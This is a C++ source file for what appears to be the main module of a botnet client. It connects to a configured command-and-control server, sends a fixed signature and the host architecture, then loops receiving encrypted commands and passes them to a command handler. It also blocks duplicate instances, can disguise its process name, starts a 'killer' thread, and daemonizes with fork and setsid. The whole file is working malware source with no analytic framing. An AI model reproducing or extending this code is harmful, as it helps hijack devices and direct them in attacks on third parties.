#define KILLER

#include "headers/main.hpp"

#include <arpa/inet.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <unistd.h>

#include <cstdio>
#include <cstring>
#include <iostream>
#include <thread>

#include "headers/config.hpp"
#include "headers/encryption.hpp"
#include "headers/methods.hpp"
#include "headers/utils.hpp"

#ifdef KILLER
#include "headers/killer.hpp"
#endif

const uint8_t SIGNATURE[] = {2, 250, 15, 193, 3, 244, 243, 250, 15, 193, 0, 0, 3, 120, 56, 54};

int Connect() {
  int fd;
  fd_set read_set;
  sockaddr_in sa;
  string arch = GetArch();

  if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
#ifdef DEBUG
    perror("[DEBUG] Cannot create a new socket\n");
#endif
    return 1;
  }

  sa.sin_family = AF_INET;
  sa.sin_port = htons(BOT_SERVER_PORT);
  sa.sin_addr.s_addr = inet_addr(BOT_SERVER_IP);

  if ((connect(fd, (struct sockaddr *)&sa, sizeof(sa))) == -1) {
#ifdef DEBUG
    printf("[DEBUG] Cannot connect to bot server\n");
#endif
    return fd;
  }

  if ((send(fd, SIGNATURE, sizeof(SIGNATURE), MSG_NOSIGNAL)) == -1) {
#ifdef DEBUG
    printf("[DEBUG] Cannot connect to bot server\n");
#endif
    return fd;
  };

  if ((send(fd, arch.c_str(), arch.size(), MSG_NOSIGNAL)) == -1) {
#ifdef DEBUG
    printf("[DEBUG] Cannot send arch\n");
#endif
    return fd;
  };

#ifdef DEBUG
  printf("[DEBUG] Connected\n");
#endif

  char buf[2 << 10];

  while (1) {
    try {
      int r = recv(fd, buf, sizeof(buf), MSG_NOSIGNAL);
      if (r < 3) {
        continue;
      }
      buf[r] = '\0';
      string res = Decrypt((string)buf);
      if (res == "BLACKLISTED") {
#ifdef DEBUG
        printf("[DEBUG] Blacklisted\n");
        exit(1);
#endif
      }
      if (res == "EXIT") {
#ifdef DEBUG
        printf("[DEBUG] Exit\n");
        exit(1);
#endif
      }

      CommandHandler(res);
    } catch (const std::exception &e) {
#ifdef DEBUG
      printf("[DEBUG] Unknown error: %s\n", e.what());
      return 1;
#endif
    }
  }
}

void AntiDublicate() {
  int fd;
  sockaddr_in sa;

  if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
#ifdef DEBUG
    printf("[DEBUG] Cannot create a new socket\n");
#endif
    return;
  }

  sa.sin_family = AF_INET;
  sa.sin_port = htons(12423);
  sa.sin_addr.s_addr = inet_addr("127.0.0.1");

  if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
#ifdef DEBUG
    printf("[DEBUG] Anti dublicate\n");
#endif
    exit(0);
  }

  if (listen(fd, 1) == -1) {
#ifdef DEBUG
    printf("[DEBUG] Anti dublicate\n");
#endif
    exit(0);
  };
}

int main(int argc, char *argv[]) {
  AntiDublicate();

  int fd;
#ifdef DEBUG
  printf("[DEBUG] Debug Mode: YES\n");
#endif

#ifdef DYNAMIC_PROC_NAME
  thread th(DynamicName, argv);
  th.detach();
#endif

  int pid = getpid();
  printf("PID: %d\n", pid);

#ifdef KILLER
#ifdef DEBUG
  printf("[DEBUG] Starting killer\n");
#endif
  thread T(StartKiller);
  T.detach();
#endif

  Init();

#ifndef NOFORK
  if (fork() > 0) {
    return 0;
  }

  setsid();

#endif

  while (1) {
    fd = Connect();
    if (fd != 1) {
      close(fd);
    }

    sleep(1);
  }
}
